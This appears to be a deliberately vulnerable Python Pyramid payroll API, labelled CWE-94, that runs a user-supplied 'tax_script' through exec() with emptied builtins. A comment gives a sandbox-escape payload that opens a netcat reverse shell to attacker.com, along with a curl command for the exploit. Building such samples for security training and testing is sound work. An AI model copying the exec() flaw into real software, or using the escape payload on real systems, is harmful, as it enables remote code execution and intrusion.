import os
import sys
import json
import sqlite3
import logging
from datetime import datetime
from wsgiref.simple_server import make_server
from pyramid.config import Configurator
from pyramid.response import Response
from pyramid.request import Request

# Configure logging for the Global Payroll Processor API
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - GlobalPayroll - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PyramidPayroll")

DB_FILE = "employee_directory.db"

def init_db():
    """Initializes the SQLite database for employee records."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE employees (
            emp_id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            department TEXT NOT NULL,
            base_salary REAL NOT NULL,
            region TEXT NOT NULL
        )
    ''')

    mock_data = [
        ('EMP-1001', 'Alice Smith', 'Engineering', 125000.0, 'US-CA'),
        ('EMP-1002', 'Bob Jones', 'Marketing', 95000.0, 'UK-LND'),
        ('EMP-1003', 'Charlie Brown', 'Sales', 110000.0, 'DE-BER')
    ]
    cursor.executemany('''
        INSERT INTO employees (emp_id, name, department, base_salary, region)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_data)

    conn.commit()
    conn.close()
    logger.info("Employee directory database initialized.")

def get_employees_by_region(region: str) -> list:
    """Retrieves employee records for a specific region."""
    employees = []
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        if region == 'ALL':
            cursor.execute("SELECT * FROM employees")
        else:
            cursor.execute("SELECT * FROM employees WHERE region = ?", (region,))
        
        for row in cursor.fetchall():
            employees.append(dict(row))
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error fetching employees: {e}")
    return employees

def generate_regional_payroll(employee_data: list, tax_script: str) -> list:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Pyramid HTTP POST JSON 'tax_script' field -> executed via exec()
    """
    logger.info("Compiling and applying dynamic regional tax logic...")
    
    # We create an isolated namespace for the dynamically executed script.
    # The script is expected to define a function called 'calculate_net_pay(employee)'
    execution_namespace = {}
    
    try:
        # Vulnerability: The payroll system allows regional HR administrators to submit
        # custom Python scripts via the API to handle complex, ever-changing local tax laws.
        # The application takes the untrusted string from the HTTP request and compiles it
        # into the runtime using exec().
        # Although __builtins__ is restricted, an attacker can bypass this sandbox by
        # navigating the Python object hierarchy (e.g., via subclasses of object) to
        # import dangerous modules like 'os' and achieve Remote Code Execution (RCE).
        
        # CWE-94 occurs instantly when the untrusted tax_script is executed.
        exec(tax_script, {"__builtins__": {}}, execution_namespace)
        
        # Retrieve the dynamically defined function
        calc_func = execution_namespace.get("calculate_net_pay")
        
        if not callable(calc_func):
            logger.error("Provided script did not define a callable 'calculate_net_pay' function.")
            return []

        processed_payroll = []
        for emp in employee_data:
            # Apply the dynamically injected function to each employee record
            net_pay = calc_func(emp)
            emp['net_pay'] = net_pay
            processed_payroll.append(emp)
            
        logger.info(f"Successfully processed payroll for {len(processed_payroll)} employees.")
        return processed_payroll
        
    except Exception as e:
        logger.error(f"Failed to execute dynamic tax script: {e}")
        return []

def health_check(request: Request):
    """Standard health check endpoint."""
    return Response(
        json={"status": "Pyramid Payroll API is operational"},
        content_type='application/json'
    )

def process_payroll_endpoint(request: Request):
    """
    API endpoint to process payroll for a specific region.
    Expects JSON payload: {"region": "US-CA", "tax_script": "def calculate_net_pay(emp):\n    return emp['base_salary'] * 0.75"}
    """
    try:
        payload = request.json_body
    except Exception:
        return Response(json={"error": "Invalid JSON payload."}, status=400, content_type='application/json')
        
    region = payload.get("region", "ALL")
    tax_script = payload.get("tax_script")
    
    if not tax_script:
        return Response(
            json={"error": "Missing 'tax_script' parameter in payload."}, 
            status=400, 
            content_type='application/json'
        )
        
    employees = get_employees_by_region(region)
    if not employees:
        return Response(
            json={"message": f"No employees found for region {region}."},
            content_type='application/json'
        )
    
    # Pass the untrusted string directly to the vulnerable function
    payroll_results = generate_regional_payroll(employees, tax_script)
    
    return Response(
        json={
            "region": region,
            "processed_count": len(payroll_results),
            "data": payroll_results
        },
        content_type='application/json'
    )

if __name__ == '__main__':
    init_db()
    
    # Configure Pyramid WSGI application
    with Configurator() as config:
        config.add_route('health', '/api/health')
        config.add_view(health_check, route_name='health', request_method='GET')
        
        config.add_route('process_payroll', '/api/payroll/process')
        config.add_view(process_payroll_endpoint, route_name='process_payroll', request_method='POST')
        
        app = config.make_wsgi_app()
    
    # Example Malicious Trigger:
    # 1. Attacker sends a POST request with a script designed to break out 
    #    of the restricted namespace and execute OS commands:
    #
    #    {
    #      "region": "US-CA",
    #      "tax_script": "def calculate_net_pay(emp):\n    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')\n    return emp.get('base_salary', 0) * 0.7"
    #    }
    #
    # 2. Attacker issues the request to the vulnerable endpoint:
    #    curl -X POST http://127.0.0.1:6543/api/payroll/process \
    #         -H "Content-Type: application/json" \
    #         -d '{"region": "ALL", "tax_script": "def calculate_net_pay(emp):\n    [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '"'"'catch_warnings'"'"'][0]()._module.__builtins__['"'"'__import__'"'"']('"'"'os'"'"').system('"'"'echo RCE_SUCCESS'"'"')\n    return emp.get('"'"'base_salary'"'"', 0) * 0.7"}'

    server = make_server('0.0.0.0', 6543, app)
    logger.info("Starting Pyramid Payroll API on http://0.0.0.0:6543")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down API...")
